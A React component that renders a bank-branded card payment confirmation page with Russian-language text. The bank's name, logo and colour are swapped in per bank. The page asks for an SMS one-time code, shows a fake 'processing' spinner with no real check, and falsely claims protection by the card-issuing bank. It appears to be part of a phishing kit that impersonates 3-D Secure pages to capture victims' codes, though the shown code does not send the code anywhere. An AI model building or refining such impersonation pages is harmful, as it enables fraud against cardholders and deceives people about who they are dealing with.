"use client";

import { StyledTypography } from "@/components/ui/StyledTypography";
import { Box, Button, CircularProgress, Divider } from "@mui/material";
import { useState } from "react";
import { useCountdown } from "@/hooks/useCountdown";
import { useRouter } from "@/i18n/navigation";
import { FULL_PATH_ROUTE } from "@myorg/shared/route";

export default function Bank({
  dev = false,
  bankName,
  bankId,
  logo,
  cardNumber,
  phone,
  color,
}: {
  bankName: string;
  bankId: string;
  logo: string;
  cardNumber: string;
  phone: string;
  dev?: boolean;
  color: string;
}) {
  const CODE_LENGTH = 6;
  const [code, setCode] = useState("");
  const [expiresAt] = useState(() =>
    new Date(Date.now() + 150_000).toISOString(),
  );

  const [loading, setloading] = useState(false);

  const { remaining } = useCountdown(expiresAt);
  const totalSeconds = Math.ceil(remaining / 1000);
  const countdown = `${String(Math.floor(totalSeconds / 60)).padStart(2, "0")}:${String(
    totalSeconds % 60,
  ).padStart(2, "0")}`;
  const router = useRouter();

  const maskedCard = `**** **** **** ${cardNumber.slice(-4)}`;

  const maskedPhone = (() => {
    const chars = [...phone];
    const digitPositions = chars
      .map((ch, i) => (/\d/.test(ch) ? i : -1))
      .filter((i) => i !== -1);
    const hidden = new Set(digitPositions.slice(4, digitPositions.length - 2));
    return chars.map((ch, i) => (hidden.has(i) ? "X" : ch)).join("");
  })();

  const handleClick = () => {
    if (dev || !code) return;
    setloading(true);
    setTimeout(() => {
      router.push(FULL_PATH_ROUTE.ok.path + "/" + bankId);
    }, 2000);
  };

  const rows: { label: string; value: string; bold?: boolean }[] = [
    { label: "Продавец", value: "NAZVANIE LTD" },
    { label: "Сумма", value: `1:00 ILS`, bold: true },
    { label: "Карта", value: maskedCard },
  ];
  return (
    <Box maxWidth={400}>
      <Box>
        <Box
          sx={{ display: "flex" }}
          fontFamily={"sans-serif"}
          alignItems={"center"}
          justifyContent={"space-between"}
          bgcolor={color}
        >
          <StyledTypography
            fontFamily={"sans-serif"}
            color="#fff"
            paddingTop={3}
            paddingLeft={3}
            fontWeight={600}
            paddingBottom={3}
            fontSize={16}
          >
            {bankName}
          </StyledTypography>
          <Box paddingRight={3} display={"flex"} gap={1} alignItems={"center"}>
            {logo && (
              <Box
                component={"img"}
                maxHeight={"30px"}
                src={logo}
                height={"100%"}
              />
            )}
            {/* <StyledTypography
            paddingTop={3}
            paddingBottom={3}
            fontSize={9}
            fontFamily={"sans-serif"}
            textTransform={"uppercase"}
            color="#ffffff81"
          >
            SECURE
          </StyledTypography> */}
          </Box>
        </Box>
        {loading ? (
          <Box
            padding={3}
            display={"flex"}
            alignItems={"center"}
            flexDirection={"column"}
            gap={3}
          >
            <StyledTypography
              fontFamily={"sans-serif"}
              fontSize={16}
              fontWeight={700}
              color="#1a1a1a"
            >
              Обработка платежа
            </StyledTypography>
            <CircularProgress sx={{ color: color }} />
            <Box
              display={"flex"}
              flexDirection={"column"}
              gap={0.5}
              alignItems={"center"}
            >
              <StyledTypography
                fontFamily={"sans-serif"}
                fontSize={14}
                color="#1a1a1a"
              >
                Проверяем код подтверждения
              </StyledTypography>
              <StyledTypography
                fontFamily={"sans-serif"}
                fontSize={12}
                color="#b0b0b0"
                textAlign={"center"}
              >
                Это может занять до минуты. Не закрывайте страницу.
              </StyledTypography>
            </Box>
          </Box>
        ) : (
          <Box padding={3}>
            <StyledTypography
              fontFamily={"sans-serif"}
              fontSize={16}
              fontWeight={700}
              color="#1a1a1a"
            >
              Подтверждение платежа
            </StyledTypography>
            <Divider sx={{ mt: 2 }} />
            {rows.map((row) => (
              <Box key={row.label}>
                <Box
                  sx={{ display: "flex" }}
                  alignItems={"center"}
                  justifyContent={"space-between"}
                  paddingY={2}
                >
                  <StyledTypography fontSize={13} color="#8a8a8a">
                    {row.label}
                  </StyledTypography>
                  <StyledTypography
                    fontSize={14}
                    fontWeight={row.bold ? 700 : 400}
                    color="#1a1a1a"
                  >
                    {row.value}
                  </StyledTypography>
                </Box>
                <Divider />
              </Box>
            ))}

            <StyledTypography
              fontFamily={"sans-serif"}
              fontSize={14}
              color="#1a1a1a"
              marginTop={4}
            >
              Введите одноразовый код, отправленный SMS-сообщением на номер{" "}
              {maskedPhone}
            </StyledTypography>

            <Box
              component={"input"}
              value={code}
              onChange={(e) => setCode(e.target.value.slice(0, CODE_LENGTH))}
              inputMode="numeric"
              autoComplete="one-time-code"
              sx={{
                width: "100%",
                marginTop: 2,
                paddingX: 1,
                paddingY: 1,
                border: "1px solid #b8b8b8",
                borderRadius: 1,
                outline: "none",
                fontFamily: "monospace",
                fontSize: 20,
                letterSpacing: 3,
                color: "#2d2d2d",
                boxSizing: "border-box",
              }}
            />

            <StyledTypography
              fontFamily={"sans-serif"}
              fontSize={13}
              color="#8a8a8a"
              marginTop={1.5}
            >
              Код действителен {countdown}
            </StyledTypography>

            <button
              onClick={handleClick}
              style={{
                marginTop: 25,
                paddingTop: 15,
                paddingBottom: 15,
                borderRadius: 0,

                backgroundColor: color,
                width: "100%",
                color: "#fff",
                fontFamily: "sans-serif",
                fontSize: 16,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontWeight: 700,
              }}
            >
              Отправить
            </button>

            <StyledTypography
              fontFamily={"sans-serif"}
              fontSize={12}
              color="#b0b0b0"
              textAlign={"center"}
              marginTop={3}
            >
              Страница защищена банком-эмитентом карты
            </StyledTypography>
          </Box>
        )}
      </Box>
    </Box>
  );
}
